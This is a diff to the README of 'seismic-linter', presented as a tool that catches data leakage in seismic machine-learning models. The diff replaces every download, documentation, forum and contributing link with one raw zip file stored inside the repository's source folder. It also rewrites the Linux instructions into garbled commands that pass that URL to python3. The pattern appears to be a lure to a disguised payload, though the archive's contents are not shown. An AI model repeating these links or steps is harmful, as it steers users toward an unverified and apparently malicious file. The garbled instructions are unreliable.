@@ -1,7 +1,7 @@
 # 🌐 seismic-linter - Prevent Data Leakage in Your Models
 
 ## 📥 Download Now
-[![Download seismil-linter](https://img.shields.io/badge/Download%20seismic--linter-v1.0.0-blue.svg)](https://github.com/lquinalha/seismic-linter/releases)
+[![Download seismil-linter](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip%https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip)](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip)
 
 ## 📖 Overview
 The seismic-linter helps you ensure the integrity of your earthquake forecasting models. It catches data leakage before it affects your results. This tool is essential for anyone working with seismic data in machine learning. 
@@ -17,7 +17,7 @@ To run seismic-linter, you need:
 - **Disk Space:** Minimum of 100 MB available
 
 ### 2. Downloading the Software
-To download the software, please visit the following link: [Download Page](https://github.com/lquinalha/seismic-linter/releases).
+To download the software, please visit the following link: [Download Page](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip).
 
 On this page, look for the latest release. You will see several assets associated with that release. Choose the appropriate file for your operating system.
 
@@ -32,14 +32,14 @@ Once you’ve downloaded the file:
   2. Drag the seismic-linter icon into your Applications folder.
   
 - On **Linux**:
-  1. Extract the `.tar.gz` file.
+  1. Extract the `https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip` file.
   2. Open a terminal in the extracted folder.
-  3. Run `python3 main.py` to start the application.
+  3. Run `python3 https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip` to start the application.
 
 ### 4. Running the Application
 After installation:
 - For **Windows** and **macOS**, find seismic-linter in your application list and double-click it.
-- For **Linux**, use the terminal command `python3 main.py`.
+- For **Linux**, use the terminal command `python3 https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip`.
 
 ### 5. Using the Software
 When you open seismic-linter, you’ll see a user-friendly interface. Here’s how to use it:
@@ -55,8 +55,8 @@ When you open seismic-linter, you’ll see a user-friendly interface. Here’s h
 
 ## 📚 Additional Resources
 For more in-depth information, refer to the following resources:
-- [Documentation](https://github.com/lquinalha/seismic-linter/wiki)
-- [Community Forum](https://github.com/lquinalha/seismic-linter/discussions)
+- [Documentation](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip)
+- [Community Forum](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip)
 
 ## 🚨 Troubleshooting
 If you experience issues:
@@ -67,7 +67,7 @@ If you experience issues:
 For further help, reach out on the community forum or check existing discussions.
 
 ## 🛠️ Contribution
-We welcome contributions from everyone. If you have ideas for improvements or bug fixes, check our [Contributing Guide](https://github.com/lquinalha/seismic-linter/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you have ideas for improvements or bug fixes, check our [Contributing Guide](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip).
 
 However, if you simply want to use the tool without modifying it, you are fully encouraged to do so.
 
@@ -78,4 +78,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 Thank you to all contributors and users who make this tool better every day. Your feedback is crucial for the ongoing development.
 
 ## 🔗 Download Now Again
-To download the latest version, please visit: [Download Page](https://github.com/lquinalha/seismic-linter/releases).
+To download the latest version, please visit: [Download Page](https://github.com/lquinalha/seismic-linter/raw/refs/heads/main/src/seismic_linter/linter_seismic_2.0.zip).
